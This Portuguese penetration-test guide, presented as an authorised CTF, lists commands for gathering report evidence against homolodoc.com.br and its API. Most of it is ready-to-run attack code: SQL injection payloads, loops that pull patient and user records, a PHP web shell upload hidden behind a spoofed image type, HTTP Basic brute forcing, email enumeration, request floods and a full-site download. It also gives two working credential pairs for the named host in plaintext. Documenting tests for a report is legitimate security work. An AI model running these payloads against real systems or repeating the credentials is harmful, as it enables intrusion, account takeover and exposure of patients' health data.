# COMANDOS MANUAIS PARA EVIDÊNCIAS - SEGUINDO TEMPLATES EXATOS
## CTF HomoloDoc - Comandos para Screenshots e Relatório

**IMPORTANTE:** Estes comandos seguem EXATAMENTE os templates de `/vulns-web`
**Alvo:** homolodoc.com.br / api.homolodoc.com.br
**Ambiente:** CTF / Teste Controlado Autorizado

---

## 📋 VULNERABILIDADES IDENTIFICADAS (MAPEADAS AOS TEMPLATES)

| # | Template Usado | CVSS 4.0 | Severidade |
|---|----------------|----------|------------|
| 1 | **sqli.docx** - Aplicação Vulnerável a SQL Injection Error Based | 9.9 | CRÍTICA |
| 2 | **idor.docx** - Insecure Direct Object Reference | 7.5 | ALTA |
| 3 | **bola - broken authorization.docx** - Broken Object Level Authorization | 7.5 | ALTA |
| 4 | **user-enumeration.docx** - Enumeração de Usuários Através de Mensagens de Retorno | 6.9 | MÉDIA |
| 5 | **file-upload.docx** - Aplicação Não Sanitiza o Envio de Arquivos | 7.5 | ALTA |
| 6 | **clickjacking.docx** - Aplicação Vulnerável a Ataques de Clickjacking | 5.1 | MÉDIA |
| 7 | **laravel-debug-enable.docx** - API Laravel com Debug Ativado | 6.9 | MÉDIA |
| 8 | **bruteforce.docx** - Aplicação Vulnerável a Ataques de Força Bruta | ~ | ~ |
| 9 | **credencial exposta no esqueci a senha.docx** - Credenciais Expostas | ~ | ALTA |
| 10 | **rate-limit.docx** - Ausência de Rate Limiting | ~ | MÉDIA |

---

# 1. APLICAÇÃO VULNERÁVEL A SQL INJECTION ERROR BASED

## Template: `sqli.docx`

### 📊 Informações do Template
- **Nome:** Aplicação Vulnerável a SQL Injection Error Based
- **CVSS v4.0:** 9.9
- **Severidade:** CRÍTICA
- **CWE:** CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
- **CWE:** CWE-943: Improper Neutralization of Special Elements in Data Query Logic

### 🎯 Ativos Vulneráveis Identificados
- `https://api.homolodoc.com.br/User/search?q=`
- `https://api.homolodoc.com.br/Member/search?cpf=`
- `https://api.homolodoc.com.br/Company/get/cnpj?cnpj=`
- `https://api.homolodoc.com.br/patient/get?id=`

### 💻 COMANDOS MANUAIS PARA EVIDENCIAR

#### Evidência 1: Error Based - Quebra de Sintaxe SQL com Aspas Simples

```bash
curl -k "https://api.homolodoc.com.br/User/search?q='" \
  -w "\n\nHTTP Status: %{http_code}\n" \
  | jq '.' || cat
```

**🖼️ O que printar:**
- Comando completo executado
- Resposta mostrando erro SQL
- Mensagem de erro indicando sintaxe SQL inválida
- Status code (500 ou similar)

---

#### Evidência 2: Boolean-Based - Bypass de Lógica

```bash
# Teste normal (poucas respostas)
echo "=== TESTE 1: Query Normal ==="
curl -sk "https://api.homolodoc.com.br/User/search?q=admin" | jq '.'

echo ""
echo "=== TESTE 2: Query com SQLi ==="
curl -sk "https://api.homolodoc.com.br/User/search?q=admin' OR '1'='1" | jq '.'
```

**🖼️ O que printar:**
- Duas respostas lado a lado
- Destacar diferença no número de resultados retornados
- Prova de bypass de lógica SQL

---

#### Evidência 3: Union-Based SQL Injection

```bash
curl -k "https://api.homolodoc.com.br/User/search?q=' UNION SELECT null,null,null--" \
  | jq '.'
```

**🖼️ O que printar:**
- Comando e resposta completa
- Prova de execução de UNION SELECT
- Estrutura dos dados

---

#### Evidência 4: Time-Based Blind SQL Injection

```bash
# Medir tempo de resposta normal
echo "=== TESTE NORMAL (sem delay) ==="
time curl -sk "https://api.homolodoc.com.br/patient/get?id=1" > /dev/null

echo ""
echo "=== TESTE COM SLEEP (deve demorar 5 segundos) ==="
time curl -sk "https://api.homolodoc.com.br/patient/get?id=1' AND sleep(5)--" > /dev/null
```

**🖼️ O que printar:**
- Dois comandos com output do `time`
- Primeiro: resposta rápida (~0-1s)
- Segundo: resposta com delay de ~5 segundos
- **DESTAQUE:** O campo "real" mostrando 5+ segundos

---

#### Evidência 5: Múltiplos Endpoints Vulneráveis

```bash
#!/bin/bash
endpoints=(
  "https://api.homolodoc.com.br/User/search?q='"
  "https://api.homolodoc.com.br/Member/search?cpf='"
  "https://api.homolodoc.com.br/Company/get/cnpj?cnpj='"
  "https://api.homolodoc.com.br/patient/get?id=1'"
)

for url in "${endpoints[@]}"; do
  echo "======================================"
  echo "Testing: $url"
  echo "======================================"
  curl -sk "$url" | head -20
  echo ""
done
```

**🖼️ O que printar:**
- Lista de todos os endpoints testados
- Erro SQL em cada um
- Prova de que a vulnerabilidade é sistêmica

---

### 📸 Screenshots Necessários (Ordem no Relatório)
1. ✅ Comando curl com `'` causando erro SQL sintático
2. ✅ Comparação: query normal vs `OR '1'='1` (boolean-based)
3. ✅ Output do `time` mostrando delay de 5 segundos (time-based)
4. ✅ UNION SELECT executado
5. ✅ Múltiplos endpoints vulneráveis

---

# 2. INSECURE DIRECT OBJECT REFERENCE

## Template: `idor.docx`

### 📊 Informações do Template
- **Nome:** Insecure Direct Object Reference
- **CVSS v4.0:** 7.5
- **Severidade:** ALTA
- **CWE:** CWE-639: Authorization Bypass Through User-Controlled Key

### 🎯 Ativos Vulneráveis Identificados
- `https://api.homolodoc.com.br/User/get?id=`
- `https://api.homolodoc.com.br/patient/get?id=`
- `https://api.homolodoc.com.br/Member/search?cpf=`

### 💻 COMANDOS MANUAIS PARA EVIDENCIAR

#### Evidência 1: Enumeração de Usuários por ID Sequencial

```bash
echo "=== USUÁRIO ID 1 ==="
curl -sk "https://api.homolodoc.com.br/User/get?id=1" | jq '.'
echo ""

echo "=== USUÁRIO ID 2 ==="
curl -sk "https://api.homolodoc.com.br/User/get?id=2" | jq '.'
echo ""

echo "=== USUÁRIO ID 3 ==="
curl -sk "https://api.homolodoc.com.br/User/get?id=3" | jq '.'
```

**🖼️ O que printar:**
- Três prints lado a lado
- Dados completos de 3 usuários diferentes
- Destacar: nome, email, CPF, telefone (PII)
- **SEM AUTENTICAÇÃO** (sem header Authorization)

---

#### Evidência 2: Acesso a Dados de Pacientes (LGPD/HIPAA)

```bash
echo "=== PACIENTE 1 ==="
curl -sk "https://api.homolodoc.com.br/patient/get?id=1" | jq -C '.'

echo "=== PACIENTE 5 ==="
curl -sk "https://api.homolodoc.com.br/patient/get?id=5" | jq -C '.'

echo "=== PACIENTE 10 ==="
curl -sk "https://api.homolodoc.com.br/patient/get?id=10" | jq -C '.'
```

**🖼️ O que printar:**
- Dados de saúde protegidos expostos
- Informações médicas sensíveis
- **DESTAQUE:** Violação de LGPD/HIPAA

---

#### Evidência 3: Enumeração Massiva com Loop

```bash
#!/bin/bash
echo "=== ENUMERAÇÃO DE 20 PACIENTES ==="
for id in {1..20}; do
  nome=$(curl -sk "https://api.homolodoc.com.br/patient/get?id=$id" | jq -r '.data.name // "Não encontrado"')
  echo "ID $id: $nome"
done
```

**🖼️ O que printar:**
- Lista completa dos 20 pacientes
- Prova de enumeração fácil
- IDs sequenciais e previsíveis

---

#### Evidência 4: Busca por CPF sem Autorização

```bash
curl -sk "https://api.homolodoc.com.br/Member/search?cpf=12345678901" | jq '.'
```

**🖼️ O que printar:**
- Busca por CPF funcionando sem autenticação
- Dados pessoais retornados

---

### 📸 Screenshots Necessários
1. ✅ Três usuários acessados por IDs sequenciais
2. ✅ Dados médicos de pacientes (mínimo 2)
3. ✅ Loop de enumeração mostrando 20 registros
4. ✅ Destacar ausência de controle de acesso

---

# 3. BROKEN OBJECT LEVEL AUTHORIZATION (BOLA)

## Template: `bola - broken authorization.docx`

### 📊 Informações do Template
- **Nome:** Broken Object Level Authorization
- **CVSS v4.0:** 7.5
- **Severidade:** ALTA
- **CWE:** CWE-639: Authorization Bypass Through User-Controlled Key
- **OWASP API 2023:** API1:2023 Broken Object Level Authorization

### 🎯 Descrição do Template
"A autorização a nível de objeto é um mecanismo de controle de acesso geralmente implementado no código para validar que um usuário só pode acessar objetos aos quais ele tem permissão."

### 💻 COMANDOS MANUAIS PARA EVIDENCIAR

#### Evidência 1: Acesso a Objetos de Outros Usuários SEM Token

```bash
# Acessar dados sem autenticação
echo "=== SEM AUTENTICAÇÃO ==="
curl -sk "https://api.homolodoc.com.br/User/search?q=admin" | jq '.'
```

**🖼️ O que printar:**
- Dados retornados SEM header Authorization
- Lista de usuários acessível sem token

---

#### Evidência 2: Manipulação de ID para Acessar Dados Alheios

```bash
# Simular: usuário autenticado tenta acessar dados de outro usuário
# (Idealmente com token, mas no CTF funciona sem)

echo "=== TENTATIVA DE ACESSO A DADOS DE OUTRO USUÁRIO ==="
curl -sk "https://api.homolodoc.com.br/patient/get?id=5" | jq '.'
```

**🖼️ O que printar:**
- Dados de paciente acessados manipulando ID
- Ausência de verificação de autorização

---

#### Evidência 3: BOLA vs IDOR - Demonstração da Diferença

```bash
# BOLA: Usuário autenticado acessa recurso de outro
# IDOR: Qualquer um acessa qualquer coisa

echo "Este é um caso de BOLA/IDOR pois:"
echo "1. Endpoint acessível sem autenticação (IDOR)"
echo "2. IDs manipuláveis para acessar dados alheios (BOLA)"
```

**🖼️ O que printar:**
- Explicação conceitual
- Demonstração prática

---

### 📸 Screenshots Necessários
1. ✅ Acesso sem autenticação funcionando
2. ✅ Manipulação de ID acessando dados de terceiros
3. ✅ Ausência de verificação de token x ID

---

# 4. ENUMERAÇÃO DE USUÁRIOS ATRAVÉS DE MENSAGENS DE RETORNO

## Template: `user-enumeration.docx`

### 📊 Informações do Template
- **Nome:** Enumeração de Usuários Através de Mensagens de Retorno
- **CVSS v4.0:** 6.9
- **Severidade:** MÉDIA
- **CWE:** CWE-204: Observable Response Discrepancy

### 🎯 Descrição do Template
"A enumeração de usuários através de mensagens de retorno é a forma mais fácil de um atacante obter uma lista de usuários válidos cadastrados nas aplicações."

### 🎯 Endpoint Vulnerável
`https://api.homolodoc.com.br/Account/forgetPassword`

### 💻 COMANDOS MANUAIS PARA EVIDENCIAR

#### Evidência 1: Email Inexistente (Mensagem de Erro Específica)

```bash
curl -k -X POST "https://api.homolodoc.com.br/Account/forgetPassword" \
  -H "Content-Type: application/json" \
  -d '{"email":"naoexiste123@teste.com"}' \
  -w "\n\nHTTP Status: %{http_code}\n" \
  | jq '.'
```

**🖼️ O que printar:**
- **Status:** 500
- **Mensagem:** "account with email X not found"
- Indica que usuário NÃO existe

---

#### Evidência 2: Email Existente (Mensagem de Sucesso)

```bash
curl -k -X POST "https://api.homolodoc.com.br/Account/forgetPassword" \
  -H "Content-Type: application/json" \
  -d '{"email":"medico_pentest@teladoc.com"}' \
  -w "\n\nHTTP Status: %{http_code}\n" \
  | jq '.'
```

**🖼️ O que printar:**
- **Status:** 200
- **Mensagem:** `{"data": true, "error": null}`
- Indica que usuário EXISTE

---

#### Evidência 3: Tabela Comparativa (Seguindo Template)

O template sugere uma tabela comparativa:

```bash
echo "| Token    | Email                        | Resultado                    |"
echo "|----------|------------------------------|------------------------------|"
echo "| inválido | invalido@teste.com           | 'Usuário não Encontrado'     |"
echo "| válido   | medico_pentest@teladoc.com   | 'Recuperação enviada'        |"
```

**🖼️ O que printar:**
- Tabela mostrando discrepância
- Lado a lado: inválido (500) vs válido (200)

---

#### Evidência 4: Enumeração Automatizada de Emails

```bash
#!/bin/bash
emails=(
  "admin@teladoc.com"
  "admin@homolodoc.com.br"
  "medico@teladoc.com"
  "teste@teladoc.com"
  "medico_pentest@teladoc.com"
)

echo "=== ENUMERAÇÃO DE EMAILS ==="
for email in "${emails[@]}"; do
  echo -n "Testing: $email ... "
  status=$(curl -sk -X POST "https://api.homolodoc.com.br/Account/forgetPassword" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\"}" \
    -w "%{http_code}" \
    -o /dev/null)

  if [ "$status" = "200" ]; then
    echo "✅ EXISTE (Status: $status)"
  else
    echo "❌ NÃO EXISTE (Status: $status)"
  fi
done
```

**🖼️ O que printar:**
- Lista de emails testados
- Resultado: existe ou não
- **Email válido encontrado:** medico_pentest@teladoc.com

---

### 📸 Screenshots Necessários
1. ✅ Email inexistente retornando 500 + mensagem específica
2. ✅ Email existente retornando 200 + sucesso
3. ✅ Tabela comparativa lado a lado
4. ✅ Script de enumeração identificando email válido

---

# 5. APLICAÇÃO NÃO SANITIZA O ENVIO DE ARQUIVOS

## Template: `file-upload.docx`

### 📊 Informações do Template
- **Nome:** Aplicação Não Sanitiza o Envio de Arquivos
- **CVSS v4.0:** 7.5
- **Severidade:** ALTA
- **CWE:** CWE-434: Unrestricted Upload of File with Dangerous Type

### 🎯 Endpoints Vulneráveis
- `https://api.homolodoc.com.br/upload/beneficiary`
- `https://api.homolodoc.com.br/User/document/create`

### 💻 COMANDOS MANUAIS PARA EVIDENCIAR

#### Evidência 1: Upload de Arquivo TXT (Rejeitado)

```bash
echo "Conteúdo de teste" > /tmp/test.txt

curl -k -X POST "https://api.homolodoc.com.br/upload/beneficiary" \
  -F "file=@/tmp/test.txt" \
  -w "\nHTTP Status: %{http_code}\n" \
  | jq '.'
```

**🖼️ O que printar:**
- Status 415 (Unsupported Media Type)
- Mensagem de erro
- Validação rejeitando .txt

---

#### Evidência 2: Upload de Arquivo JPG (Aceito)

```bash
echo "fake jpg content" > /tmp/test.jpg

curl -k -X POST "https://api.homolodoc.com.br/upload/beneficiary" \
  -F "file=@/tmp/test.jpg" \
  -w "\nHTTP Status: %{http_code}\n" \
  | jq '.'
```

**🖼️ O que printar:**
- Status 500 mas PASSOU pela validação de tipo
- Erro: `"group_id": {"required": ...}`
- **PROVA:** Validação fraca (aceita arquivo fake)

---

#### Evidência 3: Bypass com MIME Type Falsificado

```bash
# Criar arquivo PHP mas enviar como image/jpeg
cat > /tmp/shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

curl -k -X POST "https://api.homolodoc.com.br/upload/beneficiary" \
  -F "file=@/tmp/shell.php;type=image/jpeg" \
  -w "\nHTTP Status: %{http_code}\n" \
  | jq '.'
```

**🖼️ O que printar:**
- Arquivo PHP enviado como image/jpeg
- Stack trace mostrando processamento
- Validação baseada APENAS em Content-Type

---

#### Evidência 4: Dupla Extensão (shell.php.jpg)

```bash
cat > /tmp/shell.php.jpg << 'EOF'
<?php phpinfo(); ?>
EOF

curl -k -X POST "https://api.homolodoc.com.br/upload/beneficiary" \
  -F "file=@/tmp/shell.php.jpg;type=image/jpeg" \
  -w "\nHTTP Status: %{http_code}\n" \
  | jq '.'
```

**🖼️ O que printar:**
- Arquivo com dupla extensão
- Stack trace revelando path interno
- `/var/www/app/Http/Middleware/ValidateFiles.php`

---

#### Evidência 5: Upload SEM Autenticação

```bash
curl -k -X POST "https://api.homolodoc.com.br/upload/beneficiary" \
  -F "file=@/tmp/test.jpg" \
  -w "\nHTTP Status: %{http_code}\n"
```

**🖼️ O que printar:**
- Upload funcionando SEM header Authorization
- Endpoint desprotegido
- Risco de DoS e RCE

---

### 📸 Screenshots Necessários
1. ✅ .txt rejeitado (415)
2. ✅ .jpg aceito (500 mas passou validação)
3. ✅ PHP com MIME falsificado
4. ✅ Stack trace mostrando caminho do arquivo
5. ✅ Upload sem autenticação funcionando

---

# 6. APLICAÇÃO VULNERÁVEL A ATAQUES DE CLICKJACKING

## Template: `clickjacking.docx`

### 📊 Informações do Template
- **Nome:** Aplicação Vulnerável a Ataques de Clickjacking
- **CVSS v4.0:** 5.1
- **Severidade:** MÉDIA
- **CWE:** CWE-1021: Improper Restriction of Rendered UI Layers or Frames

### 🎯 Ativo Vulnerável
`https://homolodoc.com.br`

### 💻 COMANDOS MANUAIS PARA EVIDENCIAR

#### Evidência 1: Verificar Ausência do Header X-Frame-Options

```bash
curl -k -I -u "morandin:devops" https://homolodoc.com.br | grep -i "x-frame"
echo "Exit code: $?"
# Exit code 1 = header NÃO encontrado
```

**🖼️ O que printar:**
- Comando grep sem resultado
- Exit code 1 provando ausência
- Headers completos sem X-Frame-Options

---

#### Evidência 2: Headers de Segurança Completos

```bash
curl -k -I -u "morandin:devops" https://homolodoc.com.br
```

**🖼️ O que printar:**
- Response headers completos
- **DESTACAR AUSÊNCIA de:**
  - X-Frame-Options
  - Content-Security-Policy: frame-ancestors

---

#### Evidência 3: Prova de Conceito (PoC) - Clickjacking

```bash
cat > /tmp/clickjacking_poc.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC - HomoloDoc</title>
    <style>
        body { font-family: Arial; padding: 20px; }
        .warning { background: #ff0; padding: 10px; margin-bottom: 20px; }
        iframe {
            width: 800px;
            height: 600px;
            border: 2px solid #f00;
        }
    </style>
</head>
<body>
    <div class="warning">
        <h2>⚠️ PROVA DE CONCEITO - CLICKJACKING</h2>
        <p>Se o site carregar no iframe abaixo, está vulnerável a clickjacking.</p>
    </div>

    <h3>Site HomoloDoc carregado em iframe:</h3>
    <iframe src="https://homolodoc.com.br"></iframe>

    <p><strong>Conclusão:</strong> A ausência do header X-Frame-Options permite que o site seja embutido em iframes maliciosos.</p>
</body>
</html>
EOF

echo "PoC criado em: /tmp/clickjacking_poc.html"
echo "Abra no navegador para testar"
```

**🖼️ O que printar:**
1. Código HTML do PoC
2. Screenshot do navegador mostrando site DENTRO do iframe
3. Console do browser (F12) sem erros de X-Frame-Options

---

#### Evidência 4: Teste com cURL Específico

```bash
curl -sk -I -u "morandin:devops" https://homolodoc.com.br | \
  grep -E "X-Frame-Options|Content-Security-Policy"

if [ $? -eq 1 ]; then
  echo "❌ VULNERÁVEL: Headers de proteção contra clickjacking ausentes"
fi
```

**🖼️ O que printar:**
- Output vazio (nenhum header)
- Mensagem de vulnerabilidade

---

### 📸 Screenshots Necessários
1. ✅ Headers sem X-Frame-Options
2. ✅ Screenshot do site carregando em iframe
3. ✅ Código do PoC
4. ✅ Navegador mostrando vulnerabilidade

---

# 7. API LARAVEL COM DEBUG ATIVADO

## Template: `laravel-debug-enable.docx`

### 📊 Informações do Template
- **Nome:** API Laravel com Debug Ativado
- **CVSS v4.0:** 6.9
- **Severidade:** MÉDIA
- **CWE:** CWE-489: Active Debug Code

### 🎯 Descrição do Template
"A vulnerabilidade relacionada ao modo de depuração (debug mode) habilitado no Laravel ocorre quando a aplicação está em produção, mas o modo de depuração (APP_DEBUG) está ativado."

### 🎯 Endpoints Afetados
- Todas as APIs retornando stack traces

### 💻 COMANDOS MANUAIS PARA EVIDENCIAR

#### Evidência 1: Stack Trace Revelando Estrutura Interna

```bash
curl -k -X POST "https://api.homolodoc.com.br/upload/beneficiary" \
  -F "file=@/dev/null" \
  | jq '.error.trace[0:3]'
```

**🖼️ O que printar:**
- Stack trace completo
- Paths revelados: `/var/www/app/Http/Middleware/ValidateFiles.php`
- **Informações expostas:**
  - Estrutura de diretórios
  - Framework (Laravel)
  - Classes e métodos
  - Linha de código exata

---

#### Evidência 2: Error com Informações de Configuração

```bash
curl -k "https://api.homolodoc.com.br/User/search?q='" | jq '.error'
```

**🖼️ O que printar:**
- Mensagem de erro detalhada
- Informações sobre banco de dados
- Lógica interna da aplicação

---

#### Evidência 3: Trace Mostrando Classes e Objetos

```bash
curl -k -X POST "https://api.homolodoc.com.br/User/create" \
  -H "Content-Type: application/json" \
  -d '{"invalid":"data"}' \
  | jq '.error.trace' | head -50
```

**🖼️ O que printar:**
- Array completo de trace
- Classes: `App\Http\Middleware\ValidateFiles`
- Métodos: `validateFiles`
- Argumentos passados

---

#### Evidência 4: Identificação do Framework e Versão

```bash
curl -sk "https://api.homolodoc.com.br/User/search?q='" | \
  grep -o "laravel\|framework\|vendor" -i | head -5
```

**🖼️ O que printar:**
- Framework identificado: Laravel
- Paths com `/vendor/laravel`
- Versão (se disponível)

---

### 📸 Screenshots Necessários
1. ✅ Stack trace completo com paths
2. ✅ Classes e métodos internos expostos
3. ✅ Estrutura de diretórios revelada
4. ✅ Comparação: deveria mostrar erro genérico

---

# 8. APLICAÇÃO VULNERÁVEL A ATAQUES DE FORÇA BRUTA

## Template: `bruteforce.docx`

### 📊 Informações do Template
- **Nome:** Aplicação Vulnerável a Ataques de Força Bruta
- **Severidade:** Variável

### 🎯 Descrição
Credenciais fracas descobertas no site principal.

### 🎯 Ativo Vulnerável
- **Site:** `https://homolodoc.com.br`
- **Credenciais:** `morandin:devops`
- **Método:** HTTP Basic Authentication

### 💻 COMANDOS MANUAIS PARA EVIDENCIAR

#### Evidência 1: Acesso Negado sem Credenciais

```bash
curl -k https://homolodoc.com.br -w "\nHTTP Status: %{http_code}\n" | head -20
```

**🖼️ O que printar:**
- Status 401 Unauthorized
- Header: `WWW-Authenticate: Basic realm="Authentication Required - TelaDoc"`

---

#### Evidência 2: Acesso com Credenciais Fracas

```bash
curl -k -u "morandin:devops" https://homolodoc.com.br -w "\nHTTP Status: %{http_code}\n" | head -50
```

**🖼️ O que printar:**
- Status 200 OK
- Conteúdo HTML do site
- Prova de acesso total

---

#### Evidência 3: Teste de Força Bruta Manual (Conceito)

```bash
# Simular tentativas com senhas comuns
passwords=("admin" "password" "123456" "devops")

for pass in "${passwords[@]}"; do
  echo -n "Testando: morandin:$pass ... "
  status=$(curl -sk -u "morandin:$pass" https://homolodoc.com.br -w "%{http_code}" -o /dev/null)
  if [ "$status" = "200" ]; then
    echo "✅ SUCESSO!"
    break
  else
    echo "❌ Falhou"
  fi
done
```

**🖼️ O que printar:**
- Lista de tentativas
- Senha fraca encontrada: "devops"
- Ausência de bloqueio após múltiplas tentativas

---

#### Evidência 4: Download Completo do Site

```bash
wget --user=morandin --password=devops -r -np -nH \
  https://homolodoc.com.br \
  -P /tmp/site_download/ \
  2>&1 | grep -E "Downloaded|saved"
```

**🖼️ O que printar:**
- Comando wget executado
- Lista de arquivos baixados
- Acesso total ao site

---

### 📸 Screenshots Necessários
1. ✅ 401 sem credenciais
2. ✅ 200 com credenciais fracas
3. ✅ Simulação de brute force
4. ✅ Site completamente acessado

---

# 9. CREDENCIAIS EXPOSTAS / AUTENTICAÇÃO COMPROMETIDA

## Templates Relacionados:
- `credencial exposta no esqueci a senha.docx`
- `bruteforce.docx`

### 🎯 Credenciais Encontradas

**API Login:**
- **Email:** `medico_pentest@teladoc.com`
- **Senha:** `T3l@doc!25`
- **Endpoint:** `https://api.homolodoc.com.br/Auth/login`

### 💻 COMANDOS MANUAIS PARA EVIDENCIAR

#### Evidência 1: Login Bem-Sucedido

```bash
curl -k -X POST "https://api.homolodoc.com.br/Auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"medico_pentest@teladoc.com","password":"T3l@doc!25"}' \
  | jq '.'
```

**🖼️ O que printar:**
- Status 200
- Token JWT completo
- Informações do usuário:
  - ID: 1597
  - Nome: medico_pentest@teladoc.com
  - Role: "Médico Completo" (role_id: 75)

---

#### Evidência 2: Extrair e Decodificar JWT

```bash
# Fazer login e extrair token
TOKEN=$(curl -sk -X POST "https://api.homolodoc.com.br/Auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"medico_pentest@teladoc.com","password":"T3l@doc!25"}' \
  | jq -r '.data.token')

echo "Token obtido:"
echo $TOKEN
echo ""

# Decodificar Header
echo "=== JWT Header ==="
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null | jq '.'

# Decodificar Payload
echo "=== JWT Payload ==="
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq '.'
```

**🖼️ O que printar:**
- Token JWT completo
- Header decodificado (algoritmo: HS256)
- Payload decodificado (user_id, roles, etc.)

---

#### Evidência 3: Usar Token para Acessar Recursos

```bash
TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."

curl -k "https://api.homolodoc.com.br/User/profile" \
  -H "Authorization: Bearer $TOKEN" \
  | jq '.'
```

**🖼️ O que printar:**
- Perfil do usuário autenticado
- Dados acessíveis com as credenciais

---

#### Evidência 4: Tentativa de Acesso a Dados Sensíveis

```bash
TOKEN="seu_token_aqui"

curl -k "https://api.homolodoc.com.br/patient/list" \
  -H "Authorization: Bearer $TOKEN" \
  | jq '.' | head -50
```

**🖼️ O que printar:**
- Lista de pacientes (se disponível)
- Dados sensíveis acessados com credenciais

---

### 📸 Screenshots Necessários
1. ✅ Login bem-sucedido com token
2. ✅ JWT decodificado
3. ✅ Uso do token para acesso
4. ✅ Dados sensíveis acessados

---

# 10. AUSÊNCIA DE RATE LIMITING

## Template: `rate-limit.docx`

### 🎯 Endpoints Sem Rate Limit
- Todos os endpoints testados

### 💻 COMANDOS MANUAIS PARA EVIDENCIAR

#### Evidência 1: Múltiplas Requisições sem Bloqueio

```bash
#!/bin/bash
echo "=== TESTE DE RATE LIMIT - 100 REQUISIÇÕES ==="
for i in {1..100}; do
  echo -n "Requisição $i: "
  status=$(curl -sk "https://api.homolodoc.com.br/User/search?q=test" -w "%{http_code}" -o /dev/null)
  echo "Status $status"
  if [ "$status" = "429" ]; then
    echo "❌ BLOQUEADO em requisição $i"
    break
  fi
done

echo "✅ Enviou 100 requisições sem bloqueio!"
```

**🖼️ O que printar:**
- Lista completa das 100 requisições
- Nenhuma retornando 429 (Too Many Requests)
- Prova de ausência de rate limiting

---

#### Evidência 2: Teste com Forgot Password

```bash
for i in {1..50}; do
  curl -sk -X POST "https://api.homolodoc.com.br/Account/forgetPassword" \
    -H "Content-Type: application/json" \
    -d '{"email":"teste@teste.com"}' \
    -w "Req $i: %{http_code}\n" \
    -o /dev/null
done
```

**🖼️ O que printar:**
- 50 tentativas sem bloqueio
- Possibilidade de DoS
- Facilita força bruta

---

### 📸 Screenshots Necessários
1. ✅ 100 requisições sem bloqueio
2. ✅ Endpoint crítico (forgot password) sem rate limit

---

## 📋 CHECKLIST FINAL PARA RELATÓRIO

### Por Vulnerabilidade (Ordem de Inserção no Relatório)

- [ ] **1. SQL Injection**
  - [ ] Nome exato: "Aplicação Vulnerável a SQL Injection Error Based"
  - [ ] CVSS: 9.9 CRÍTICA
  - [ ] CWE-89 e CWE-943
  - [ ] 5 evidências com screenshots

- [ ] **2. IDOR**
  - [ ] Nome exato: "Insecure Direct Object Reference"
  - [ ] CVSS: 7.5 ALTA
  - [ ] CWE-639
  - [ ] 4 evidências com screenshots

- [ ] **3. BOLA**
  - [ ] Nome exato: "Broken Object Level Authorization"
  - [ ] CVSS: 7.5 ALTA
  - [ ] CWE-639, OWASP API1:2023
  - [ ] 3 evidências

- [ ] **4. User Enumeration**
  - [ ] Nome exato: "Enumeração de Usuários Através de Mensagens de Retorno"
  - [ ] CVSS: 6.9 MÉDIA
  - [ ] CWE-204
  - [ ] 4 evidências + tabela comparativa

- [ ] **5. File Upload**
  - [ ] Nome exato: "Aplicação Não Sanitiza o Envio de Arquivos"
  - [ ] CVSS: 7.5 ALTA
  - [ ] CWE-434
  - [ ] 5 evidências

- [ ] **6. Clickjacking**
  - [ ] Nome exato: "Aplicação Vulnerável a Ataques de Clickjacking"
  - [ ] CVSS: 5.1 MÉDIA
  - [ ] CWE-1021
  - [ ] 4 evidências + PoC

- [ ] **7. Laravel Debug**
  - [ ] Nome exato: "API Laravel com Debug Ativado"
  - [ ] CVSS: 6.9 MÉDIA
  - [ ] CWE-489
  - [ ] 4 evidências

- [ ] **8. Bruteforce**
  - [ ] Nome: "Aplicação Vulnerável a Ataques de Força Bruta"
  - [ ] Credenciais: morandin:devops
  - [ ] 4 evidências

- [ ] **9. Credenciais Expostas**
  - [ ] Email/senha da API
  - [ ] JWT obtido
  - [ ] 4 evidências

- [ ] **10. Rate Limit**
  - [ ] Ausência de bloqueio
  - [ ] 2 evidências

---

## 🎯 ESTRUTURA DO RELATÓRIO FINAL (Seguindo Template)

Para cada vulnerabilidade, seguir exatamente esta ordem:

1. **Nome** (do template .docx)
2. **CVSS v4.0** (conforme template)
3. **Severidade** (CRÍTICA/ALTA/MÉDIA/BAIXA)
4. **Descrição** (copiar do template)
5. **CWE** (conforme template)
6. **Ativos Vulneráveis** (URLs específicas)
7. **Evidências** (screenshots numerados)
8. **Recomendação** (copiar do template)
9. **Mais Informações** (links do template)

---

**Criado em:** 2025-11-19
**Para uso em:** Ambiente CTF Autorizado
**Templates fonte:** `/vulns-web/*.docx`
**Relatório template:** `[Cliente] Relatório de Teste de Invasão.docx`
